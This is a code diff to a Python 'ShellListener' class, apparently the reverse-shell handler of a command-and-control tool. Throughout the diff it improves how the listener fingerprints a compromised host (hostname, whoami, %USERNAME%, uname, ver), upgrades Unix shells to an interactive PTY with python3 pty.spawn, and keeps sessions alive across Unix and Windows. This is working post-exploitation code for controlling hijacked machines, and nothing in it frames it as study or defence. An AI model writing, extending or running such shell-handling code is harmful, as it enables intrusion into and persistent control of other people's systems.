@@ -273,7 +273,13 @@ class ShellListener:
                         return lines[-1].strip() if lines else ""
                     
                     def _send_and_recv(cmd_str: str, wait: float = 1.0) -> str:
-                        """Send a command and receive output."""
+                        """Send a command and receive output.
+
+                        Args:
+                            cmd_str: The shell command to send (should end with newline).
+                            wait: Seconds to wait after sending before reading. Increase
+                                  for slow connections or complex commands.
+                        """
                         # Drain any leftover data first
                         conn.settimeout(0.3)
                         try:
@@ -284,7 +290,6 @@ class ShellListener:
                         except (socket.timeout, OSError):
                             pass
 
-                        # Send command with both \n and \r\n for cross-platform
                         conn.sendall(cmd_str.encode('utf-8'))
                         time.sleep(wait)
                         chunks = b""
@@ -301,25 +306,36 @@ class ShellListener:
                             pass
                         return chunks.decode('utf-8', errors='replace')
 
-                    # Try to get hostname using markers (works on both Unix and Windows)
+                    # Info gathering: use echo markers with && which works on
+                    # both Unix bash/sh and Windows cmd.exe.  The `hostname`
+                    # and `whoami` commands exist on all major platforms.
                     hostname_cmd = f'echo {marker_start} && hostname && echo {marker_end}\n'
                     hostname_raw = _send_and_recv(hostname_cmd)
                     hostname = _extract_output(hostname_raw, marker_start, marker_end)
                     if not hostname or hostname == "unknown":
                         hostname = default_hostname
 
-                    # Try to get username using markers
+                    # whoami exists on both Unix and Windows.  Fall back to
+                    # %USERNAME% on Windows if whoami is missing.
                     user_cmd = f'echo {marker_start} && whoami && echo {marker_end}\n'
                     shell_user_raw = _send_and_recv(user_cmd)
                     shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
                     if not shell_user or shell_user == "unknown":
-                        shell_user = "unknown"
+                        # Fallback for Windows without whoami
+                        fallback_cmd = f'echo {marker_start} && echo %USERNAME% && echo {marker_end}\n'
+                        fb_raw = _send_and_recv(fallback_cmd)
+                        fb = _extract_output(fb_raw, marker_start, marker_end)
+                        if fb and fb != '%USERNAME%':
+                            shell_user = fb
+                        else:
+                            shell_user = "unknown"
 
-                    # Try to detect OS using markers
-                    os_cmd = f'echo {marker_start} && (uname -s 2>/dev/null || ver) && echo {marker_end}\n'
+                    # OS detection: try uname first (Unix), then ver (Windows).
+                    # Run them as separate commands to avoid syntax issues.
+                    os_cmd = f'echo {marker_start} && uname -s && echo {marker_end}\n'
                     os_info_raw = _send_and_recv(os_cmd)
                     os_info = _extract_output(os_info_raw, marker_start, marker_end)
-                    os_info_full = os_info_raw  # Keep full output for broader matching
+                    os_info_full = os_info_raw
                     if 'Linux' in os_info or 'Linux' in os_info_full:
                         platform = 'Linux'
                     elif 'Darwin' in os_info or 'Darwin' in os_info_full:
@@ -327,12 +343,18 @@ class ShellListener:
                     elif any(w in os_info_full for w in ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN']):
                         platform = 'Windows'
                     else:
-                        platform = 'Unknown'
+                        # uname failed — try Windows 'ver'
+                        ver_cmd = f'echo {marker_start} && ver && echo {marker_end}\n'
+                        ver_raw = _send_and_recv(ver_cmd)
+                        if any(w in ver_raw for w in ['Windows', 'Microsoft']):
+                            platform = 'Windows'
+                        else:
+                            platform = 'Unknown'
 
-                    # Attempt PTY upgrade on Linux/macOS for a proper
+                    # Attempt PTY upgrade on Unix-like systems for a proper
                     # interactive shell (colour, job control, etc.)
                     # Skip for Windows shells where PTY upgrade doesn't apply.
-                    if platform in ('Linux', 'macOS', 'Unknown'):
+                    if platform != 'Windows':
                         try:
                             pty_cmd = (
                                 "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
@@ -421,11 +443,12 @@ class ShellListener:
                                     db.session.commit()
                             continue
 
-                        # Keepalive: send an empty echo which is silent on
-                        # both Unix and Windows shells.
+                        # Keepalive: send a no-op that is silent on all platforms.
+                        # Unix: `true` produces no output.  Windows cmd: `rem`
+                        # is a comment.  We try both via `||`.
                         conn.settimeout(30)
                         try:
-                            conn.sendall(b'echo .\n')
+                            conn.sendall(b'true 2>/dev/null || rem\n')
                         except (BrokenPipeError, ConnectionResetError, OSError):
                             print(f"[-] Keepalive failed for shell {shell_id} — connection broken")
                             break
